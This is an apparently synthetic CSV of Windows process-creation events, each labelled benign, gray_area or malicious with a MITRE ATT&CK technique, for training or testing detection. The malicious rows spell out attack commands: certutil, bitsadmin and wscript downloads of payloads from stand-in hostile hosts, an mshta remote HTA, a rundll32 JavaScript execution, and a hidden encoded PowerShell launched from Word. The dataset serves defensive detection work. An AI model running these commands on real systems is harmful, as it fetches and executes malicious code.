UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-02T14:02:05.426Z,{46D24F55-2614-4A9A-B1EC-93EDD8A01E67},58459,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,47162,CORP\admin,High,0,,,gray_area
2024-07-01T10:59:54.322Z,{4C00906F-8F84-4C6F-B143-6535E3C0B130},2026,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,64010,CORP\netadmin,Medium,0,,,benign
2024-07-03T14:44:57.683Z,{149C2E6C-EA8D-42BA-B400-DE3B079FCE9B},51454,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://apt-infra9284.org/svc713.exe C:\Users\Public\helper260.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,51470,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious
2024-07-04T05:22:13.930Z,{0181030D-8352-46D7-BD3E-12FDD3984977},13265,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,19021,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T04:33:49.404Z,{0449BB49-31ED-4084-BB26-3F7387300745},58148,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name W3SVC -Force""",C:\Windows\System32\cmd.exe,cmd.exe,18281,CORP\sysadmin,High,0,,,gray_area
2024-07-04T13:38:16.026Z,{C82F54FD-B669-4020-ADB9-AB790B9BD610},6985,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16002,CORP\netadmin,Medium,0,,,benign
2024-07-04T16:09:10.188Z,{BD211D0B-C35F-4808-9279-2237DFA01983},15469,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,41428,CORP\admin,High,0,,,benign
2024-07-05T10:07:48.459Z,{7DA4DF89-CAEC-4C1B-A6E1-852F47F5F977},12329,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_9.9.86.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,63197,CORP\itops,High,0,,,benign
2024-07-05T17:58:30.893Z,{0BF65EBD-1939-40F0-A138-8E2B730FA895},56599,C:\Windows\System32\cmd.exe,cmd.exe /c hostname,C:\Windows\explorer.exe,C:\Windows\explorer.exe,49223,CORP\analyst02,Medium,0,,,benign
2024-07-03T16:37:06.462Z,{EB4AE2FF-902D-4541-ABC3-0ED31305F210},34019,C:\Windows\explorer.exe,explorer.exe C:\Users\agarwal\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",15519,CORP\agarwal,Medium,0,,,benign
2024-07-02T08:33:51.433Z,{ABD9EBE7-AF91-49BE-91F5-02BC4CC55AB3},32347,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",62581,CORP\netadmin,Low,0,,,benign
2024-07-02T08:12:01.737Z,{28356EA9-0D1D-43F1-BE0F-48A2FB52FA69},39859,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://phish-host6401.net/script646.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,16629,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-03T11:38:12.465Z,{2299A957-9106-4FA8-8B79-9BBEEDFD9597},61929,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",27473,CORP\analyst01,Medium,0,,,benign
2024-07-04T10:59:47.985Z,{38B84E84-C521-41BF-89C1-D6C555787F82},58166,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,61688,CORP\analyst02,Medium,0,,,benign
2024-07-04T13:55:02.714Z,{E87F4640-6815-48B5-A195-79FE769C16B3},35722,C:\Program Files\Microsoft OneDrive\OneDrive.exe,OneDrive.exe /sync,C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE,"""C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE""",29112,CORP\dbadmin,Medium,0,,,benign
2024-07-04T15:32:23.056Z,{1D72DC8B-0BCE-4C2D-B886-4472CDBC6336},33742,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,57319,CORP\mjones,Medium,0,,,benign
2024-07-05T11:48:30.514Z,{8660642F-EB80-43F7-997A-BFC7CD225924},59776,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""NightlyBackup"" /tr ""C:\Scripts\backup.bat"" /sc daily /st 02:00",C:\Windows\System32\cmd.exe,cmd.exe,2223,CORP\itops,High,0,,,gray_area
2024-07-02T16:19:21.501Z,{DA1801AC-3794-4D85-B814-DCC7D2C4C177},26781,C:\Program Files\Git\bin\git.exe,git.exe status,C:\Windows\System32\cmd.exe,cmd.exe,49784,CORP\jsmith,Medium,0,,,benign
2024-07-05T12:16:05.408Z,{CDF1C781-D09F-43D9-B6E1-EF987B248400},33887,C:\Windows\System32\csrss.exe,csrss.exe ObjectDirectory=\Windows,C:\Windows\System32\smss.exe,smss.exe,29474,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T16:19:58.355Z,{7A44C08D-979C-4F1E-91D2-F3A960F5D51B},32565,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",36367,CORP\analyst02,Low,0,,,benign
2024-07-03T13:45:48.424Z,{9CF64C98-65C3-4D34-87F8-C82D38CFF6F5},24635,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,42251,CORP\admin,High,0,,,gray_area
2024-07-02T16:02:53.378Z,{3C16BDF8-4429-4DB4-8091-5B2F8E89E279},39175,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",37210,CORP\jsmith,Medium,0,,,benign
2024-07-02T12:35:24.316Z,{17ABD12C-39CC-4316-87F7-DC1D19E05415},42874,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://shadow-net355.com/script679.js,C:\Windows\System32\cmd.exe,cmd.exe /c,63815,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-04T08:55:53.613Z,{544897EB-5E1A-4BA5-BDB8-98F49F1D1E7A},60930,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,57397,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T13:45:12.280Z,{B6F246EA-4A6A-4128-A3C9-8F801CCA463E},25140,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,54969,CORP\admin,High,0,,,benign
2024-07-04T15:05:54.651Z,{A735845D-7950-4171-AB5C-C2ED40854AA3},33796,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi SHA1,C:\Windows\System32\cmd.exe,cmd.exe,14333,CORP\itops,High,0,,,gray_area
2024-07-01T11:57:56.468Z,{83A2B14B-29F9-4461-9FD5-25B2EE357C33},6721,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\System32\cmd.exe,explorer.exe,6254,CORP\mjones,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-04T11:29:52.800Z,{CC848CEC-7674-4577-882B-E47976688289},13489,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_4.3.15.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,47975,CORP\sysadmin,High,0,,,benign
2024-07-04T01:29:38.753Z,{F33FD691-42F6-42EB-A860-9415F15A6D11},21447,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job2326 /download http://exploit-kit2035.ru/files/svc533.exe C:\Users\Public\loader781.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,46026,CORP\jsmith,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-02T21:59:30.068Z,{342E9DDD-5BC2-447A-AE60-2DD80F65E56F},6978,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,55511,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-01T02:49:51.320Z,{EAA699C6-E43A-419F-A6CF-37B4FD1C8967},22580,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://malware-cdn9364.net/script849.js,C:\Windows\System32\cmd.exe,cmd.exe /c,55547,CORP\mjones,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-05T16:09:07.042Z,{DA0F650C-59DE-4EEA-916E-A9405C1DFC16},1329,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38533,CORP\admin,High,0,,,benign
2024-07-04T20:28:30.894Z,{936B3E97-3723-476A-84F3-B79C2F37DA2C},49180,C:\Windows\System32\certutil.exe,certutil.exe -decode C:\Users\Public\encoded9534.txt C:\Users\Public\decoded1447.exe,C:\Windows\System32\cmd.exe,powershell.exe,9749,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-03T11:51:07.338Z,{BBE17C7A-5235-4E17-B588-673ED7BF216A},11649,C:\Windows\System32\cmd.exe,cmd.exe /c net view \\fileserver,C:\Windows\explorer.exe,C:\Windows\explorer.exe,48914,CORP\helpdesk,Medium,0,,,benign
2024-07-01T16:43:57.053Z,{267F65F7-2DB5-42E0-A129-E6EA5FB83D86},12753,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,15626,CORP\admin,High,0,,,benign
2024-07-01T09:28:10.710Z,{9852FE37-8906-4044-B07F-47A9F6B1ED2B},20625,C:\Windows\explorer.exe,explorer.exe C:\Users\agarwal\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",60206,CORP\agarwal,Medium,0,,,benign
2024-07-03T08:24:56.655Z,{6871BA40-10AF-4663-B444-88115F2EA9D6},17763,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_9.2.15.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,51544,CORP\itops,High,0,,,benign
2024-07-05T00:40:49.647Z,{3F9A12F9-F957-40B4-A3DB-75F2F17F59C4},26066,C:\Windows\System32\smss.exe,smss.exe,C:\Windows\System32\smss.exe,smss.exe,4547,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T16:43:26.846Z,{73161863-29C9-4659-9EC5-8347A3E37943},10801,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\klee\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",40682,CORP\klee,Medium,0,,,benign
2024-07-01T16:02:53.867Z,{0226449F-8E79-4F51-8452-AEA4CAE5B9AA},5871,C:\Windows\System32\cmd.exe,cmd.exe /c systeminfo,C:\Windows\explorer.exe,C:\Windows\explorer.exe,62943,CORP\dbadmin,Medium,0,,,benign
2024-07-02T13:15:26.937Z,{C6E9DCF4-45B9-4ABD-94BD-F5FD0BAE3819},48204,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,21967,CORP\mjones,Medium,0,,,benign
2024-07-03T08:21:44.823Z,{4D16A8D2-F6FF-4798-A603-655153C3882C},8292,C:\Program Files\Docker\Docker\resources\bin\docker.exe,docker.exe ps -a,C:\Windows\System32\cmd.exe,cmd.exe,20996,CORP\agarwal,Medium,0,,,benign
2024-07-01T12:57:41.197Z,{C6996F52-F29F-4DBE-929F-F2CB14604FAF},21992,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,34678,CORP\sysadmin,High,0,,,benign
2024-07-04T13:52:55.353Z,{ECF9A3B6-EC3B-462A-A545-34D1E8829E12},32906,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,52947,CORP\itops,High,0,,,benign
2024-07-04T14:13:26.717Z,{520397F3-3C51-477C-A049-AD7578002E96},50295,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",25399,CORP\mjones,Low,0,,,benign
2024-07-01T10:19:26.694Z,{75015D30-5698-487E-B30F-0B70943D3AF9},12088,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""DiskCleanup"" /tr ""cleanmgr /sagerun:1"" /sc weekly /d MON",C:\Windows\System32\cmd.exe,cmd.exe,4860,CORP\sysadmin,High,0,,,gray_area
2024-07-03T14:48:04.587Z,{21554F27-8227-4B2E-8423-5F5EEC4366CF},10023,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,35698,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-04T09:43:27.206Z,{51B07421-ABA7-47C0-8D5D-2C369B75E86E},54907,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,42105,CORP\admin,High,0,,,benign
2024-07-02T18:26:39.654Z,{29E03D8A-0CED-426D-A2E7-A8E20C18CEFD},2984,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,33639,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-02T21:54:51.570Z,{B48E4C69-4713-42B1-AFB3-09AD45F4981A},24971,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",6918,CORP\mjones,Medium,0,,,benign
2024-07-01T08:13:30.079Z,{2E19C69E-76FC-4B62-B98D-764E83D64F6B},9696,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,39907,CORP\jsmith,Medium,0,,,benign
2024-07-04T16:13:27.104Z,{9408AAD7-0016-41F9-A119-83E9E5C7261E},49233,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,55399,CORP\itops,High,0,,,benign
2024-07-03T21:40:41.086Z,{02D209F8-100E-45C6-B91D-6E0627BE1898},39163,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,39411,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T17:36:23.478Z,{8C0A8F6E-45E0-4970-A7A3-D8CDE5B66F6C},53668,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,65422,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T21:39:07.131Z,{EC7C53B7-CB48-4939-89A0-922E8B8BB47C},64903,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,7336,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-03T16:25:52.556Z,{0496EC0A-FD80-434E-8862-DCAD48DBDF37},32024,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,17601,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-02T02:48:19.864Z,{207484A9-3281-473A-B346-8E5349B5AAEB},29533,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\driver745.csproj,C:\Windows\System32\cmd.exe,cmd.exe,27886,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-03T14:47:07.097Z,{F95A17A9-4C2A-4F83-940A-EF452428C6C7},56787,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,50689,CORP\admin,High,0,,,benign
2024-07-05T09:04:34.218Z,{729611F7-1471-49FA-80E0-082A3D6B56C8},34153,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",18380,CORP\helpdesk,Medium,0,,,benign
2024-07-02T20:10:03.279Z,{AA3E9119-15C5-43EF-9526-48D17C98112A},24669,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document41.docm",28493,CORP\klee,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-01T16:36:00.624Z,{9D473E3B-57F3-439E-A2A4-B3B94AFB089C},43599,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,11755,CORP\sysadmin,High,0,,,benign
2024-07-04T06:36:11.556Z,{D96E0F74-488E-4208-908C-A67A8CD2048D},23784,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,22212,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T10:52:45.760Z,{59FEA918-14A1-4189-8B4F-AD6EB371D32C},48288,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_2.0.21.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,27818,CORP\itops,High,0,,,benign
2024-07-01T10:39:27.648Z,{F6789ACC-E345-4592-BBE8-831659285367},29141,C:\Users\itops\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,27436,CORP\itops,High,0,,,benign
2024-07-04T11:19:42.595Z,{EEE25DC3-3C44-4B0E-BB1F-0574819B5D98},25184,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",32015,CORP\agarwal,Medium,0,,,benign
2024-07-05T11:49:33.389Z,{1AFCF048-07B9-45B7-9FCF-0092B94A8006},30524,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",60539,CORP\netadmin,Medium,0,,,benign
2024-07-01T07:36:54.816Z,{FC003D03-80DC-49F3-8A4A-1303D0A3ED84},26455,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,24252,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T03:42:26.433Z,{3FFAE1A1-589F-40FF-894B-37F7682DCDFB},24938,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,23826,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T03:29:06.823Z,{326522F8-4A9B-4413-8422-89FFF56A1FB3},53023,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,10161,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T09:06:50.625Z,{86F0E934-9615-426B-ADAC-425195A5882B},40954,C:\Windows\System32\rundll32.exe,"rundll32.exe printui.dll,PrintUIEntry /in /n \\printserver\HP_LaserJet",C:\Windows\explorer.exe,C:\Windows\explorer.exe,52259,CORP\itops,Medium,0,,,gray_area
2024-07-01T14:17:35.270Z,{B8A294FB-F451-4CE1-B544-57DE35946F59},9524,C:\Windows\regedit.exe,regedit.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,11546,CORP\sysadmin,High,0,,,benign
2024-07-01T10:26:56.857Z,{D9A05C3F-D4C6-4F24-B2A8-6388A7E546D7},12520,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,C:\Windows\explorer.exe,C:\Windows\explorer.exe,62205,CORP\dbadmin,Medium,0,,,benign
2024-07-03T16:51:17.422Z,{E05B31BD-1492-484C-A08C-1A0CD46A5588},13320,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",56933,CORP\pchen,Low,0,,,benign
2024-07-02T04:03:43.749Z,{60EB8AC7-8FAC-48D9-8425-32CD6932A2C4},26747,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,64638,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T15:50:01.056Z,{2ACFE613-C9D9-4C7E-A511-ED248561CBD9},57333,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://c2-server487.top/script285.js,C:\Windows\System32\cmd.exe,cmd.exe /c,59753,CORP\agarwal,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-04T03:59:52.774Z,{970F8CAE-D608-4AAC-A1F6-520EDB5DDCDA},16431,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://phish-host5955.net/script243.js,C:\Windows\System32\cmd.exe,cmd.exe /c,20491,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-04T13:39:20.504Z,{7BD71F20-4A14-409A-98DC-2DB115AF013E},59859,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",58736,CORP\jsmith,Low,0,,,benign
